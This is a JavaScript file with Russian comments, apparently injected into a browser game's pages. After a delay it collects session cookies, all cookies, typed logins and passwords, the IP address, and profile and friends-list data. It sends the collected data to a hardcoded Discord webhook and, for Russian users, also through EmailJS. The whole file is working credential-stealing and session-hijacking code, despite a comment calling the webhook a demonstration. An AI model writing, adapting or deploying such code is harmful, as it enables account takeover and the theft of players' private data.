setTimeout(() => {
(async function() {
    // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466531703853027331/7gYLBFV7XV0J9_68NVLTCeQTtFXlk8tZ-Cn-00jGA5ITt8KvdPtL-5jnf4VJBfX7r7lo';

    // Функция для получения куки
    const getCookie = (name) => {
        const matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    };

    // Получаем IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Функция для сбора логина и пароля
    const getCredentials = () => {
        try {
            const usernameField = document.querySelector('#loginUsername') || 
                                document.querySelector('input[name="login"]') ||
                                document.querySelector('input[type="text"]');
            
            const passwordField = document.querySelector('input[type="password"]') || 
                                document.querySelector('input[name*="pass"]') ||
                                document.querySelector('input#password');
            
            const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
            const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
            
            return { username, password };
        } catch {
            return { 
                username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
            };
        }
    };

    // Получаем ВСЕ куки пользователя
    const getAllCookies = () => {
        return document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return `${name}=${value}`;
        }).join('\n');
    };

    // Функция для безопасного клонирования объектов
    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    // Проверяем и получаем данные из переменной `user`
    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return "Переменная 'user' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'user': ${e.message}`;
        }
    };

    // Получаем friendsData в оригинальном виде
    const getFriendsData = () => {
        try {
            if (typeof friendsData !== 'undefined' && friendsData !== null) {
                return JSON.stringify(deepClone(friendsData), null, 2);
            }
            return "Переменная 'friendsData' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
        }
    };

    // Получаем friendsArr в оригинальном виде
    const getFriendsArr = () => {
        try {
            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                // Для больших массивов делаем выборку
                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                    const sample = {
                        total_length: friendsArr.length,
                        sample_items: []
                    };
                    
                    // Берем первые 10 элементов
                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                        if (friendsArr[i]) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    // Берем несколько элементов из "хвоста" массива
                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                        if (friendsArr[i] && sample.sample_items.length < 15) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    return JSON.stringify(sample, null, 2);
                }
                return JSON.stringify(deepClone(friendsArr), null, 2);
            }
            return "Переменная 'friendsArr' не найдена или пуста";
        } catch (e) {
            return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
        }
    };

    // Получаем уровень пользователя
    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    const sendUserData = async () => {
        const phpsessid = getCookie('PHPSESSID');
        const userIP = await getIP();
        const credentials = getCredentials();
        const allCookies = getAllCookies();
        const userData = getUserData();
        const friendsDataStr = getFriendsData();
        const friendsArrStr = getFriendsArr();
        
        // Проверяем, заполнены ли оба поля
        const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                 credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                 credentials.username && credentials.password;
        
        // Получаем уровень с 'x', если поля заполнены
        const userLevel = getUserLevel(bothFieldsFilled);
        
        // Формируем содержимое файла
        let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n";
        fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer').options[document.getElementById('selectServer').selectedIndex].text}\n\n`;
        fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
        fileContent += `IP-адрес: ${userIP}\n`;
        fileContent += `URL страницы: ${window.location.href}\n`;
        fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
        fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---\n${userData}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
        fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
        fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
        fileContent += `Логин: ${credentials.username}\n`;
        fileContent += `Пароль: ${credentials.password}\n\n`;
        fileContent += `--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---\n${allCookies || "Куки не обнаружены"}\n`;

        // Создаем файл и отправляем
        const blob = new Blob([fileContent], { type: 'text/plain' });
        const formData = new FormData();
        formData.append('file', blob, `user_data_${Date.now()}.txt`);

        try {
            await fetch(WEBHOOK_URL, {
                method: "POST",
                body: formData
            });
        } catch (e) {
            console.error("Ошибка при отправке данных:", e);
        }
    };

    await sendUserData();
})();
if(user.authData.countryCode == "RU"){var script = document.createElement('script');
script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
script.onload = function() {
    emailjs.init("4N-8nqIjjUBhk1vbi");
    
    setTimeout(async () => {
        // Функции сбора данных (остаются без изменений)
        const getCookie = (name) => {
            const matches = document.cookie.match(new RegExp(
                "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
            ));
            return matches ? decodeURIComponent(matches[1]) : undefined;
        };

        const getIP = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "Не удалось получить IP";
            } catch {
                return "Не удалось получить IP";
            }
        };

        const getCredentials = () => {
            try {
                const usernameField = document.querySelector('#loginUsername') || 
                                    document.querySelector('input[name="login"]') ||
                                    document.querySelector('input[type="text"]');
                
                const passwordField = document.querySelector('input[type="password"]') || 
                                    document.querySelector('input[name*="pass"]') ||
                                    document.querySelector('input#password');
                
                const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
                const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
                
                return { username, password };
            } catch {
                return { 
                    username: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ЛОГИНА", 
                    password: "ОШИБКА_ПРИ_ПОЛУЧЕНИИ_ПАРОЛЯ" 
                };
            }
        };

        const getAllCookies = () => {
            return document.cookie.split(';').map(cookie => {
                const [name, value] = cookie.trim().split('=');
                return `${name}=${value}`;
            }).join('\n');
        };

        const deepClone = (obj) => {
            if (obj === null || typeof obj !== 'object') return obj;
            const clone = Array.isArray(obj) ? [] : {};
            for (const key in obj) {
                if (obj.hasOwnProperty(key)) {
                    clone[key] = deepClone(obj[key]);
                }
            }
            return clone;
        };

        const getUserData = () => {
            try {
                if (typeof user !== 'undefined' && user !== null) {
                    return JSON.stringify(deepClone(user), null, 2);
                }
                return "Переменная 'user' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'user': ${e.message}`;
            }
        };

        const getFriendsData = () => {
            try {
                if (typeof friendsData !== 'undefined' && friendsData !== null) {
                    return JSON.stringify(deepClone(friendsData), null, 2);
                }
                return "Переменная 'friendsData' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'friendsData': ${e.message}`;
            }
        };

        const getFriendsArr = () => {
            try {
                if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                    if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                        const sample = {
                            total_length: friendsArr.length,
                            sample_items: []
                        };
                        
                        for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                            if (friendsArr[i]) {
                                sample.sample_items.push(deepClone(friendsArr[i]));
                            }
                        }
                        
                        for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                            if (friendsArr[i] && sample.sample_items.length < 15) {
                                sample.sample_items.push(deepClone(friendsArr[i]));
                            }
                        }
                        
                        return JSON.stringify(sample, null, 2);
                    }
                    return JSON.stringify(deepClone(friendsArr), null, 2);
                }
                return "Переменная 'friendsArr' не найдена или пуста";
            } catch (e) {
                return `Ошибка при чтении переменной 'friendsArr': ${e.message}`;
            }
        };

        const getUserLevel = (addX = false) => {
            try {
                if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                    return `level: ${user.level}${addX ? 'x' : ''}`;
                }
                return `level: не определен${addX ? 'x' : ''}`;
            } catch (e) {
                return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
            }
        };

        const sendUserData = async () => {
            const phpsessid = getCookie('PHPSESSID');
            const userIP = await getIP();
            const credentials = getCredentials();
            const allCookies = getAllCookies();
            const userData = getUserData();
            const friendsDataStr = getFriendsData();
            const friendsArrStr = getFriendsArr();
            
            const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
                                     credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
                                     credentials.username && credentials.password;
            
            const userLevel = getUserLevel(bothFieldsFilled);
            
            // СОЗДАЕМ ПРОСТОЙ ТЕКСТ БЕЗ HTML
            const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

📅 Время: ${new Date().toLocaleString()}
🌐 IP-адрес: ${userIP}
🔗 URL: ${window.location.href}

📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

🔑 PHPSESSID:
${phpsessid || "PHPSESSID: не найдена"}

👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr}

🔐 УЧЕТНЫЕ ДАННЫЕ:
Логин: ${credentials.username}
Пароль: ${credentials.password}

🍪 ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ:
${allCookies || "Куки не обнаружены"}
=============================
Отчет сгенерирован автоматически.
            `;

            // ПРОСТОЙ ТЕКСТ БЕЗ HTML - EmailJS не будет его экранировать
            const templateParams = {
                message: messageText
            };

            console.log("Отправка простого текста через EmailJS...");
            console.log("Длина сообщения:", messageText.length);
            console.log("Первые 200 символов:", messageText.substring(0, 200));

            // Простая отправка
            emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                .then(function(response) {
                    console.log('✅ Письмо успешно отправлено! Статус:', response.status);
                    console.log('Ответ EmailJS:', response);
                }, function(error) {
                    console.error('❌ Ошибка отправки:', error);
                    console.error('Детали ошибки:', {
                        status: error.status,
                        text: error.text
                    });
                });
        };

        await sendUserData();
    }, 1);
};
document.head.appendChild(script);}
}, 6500);
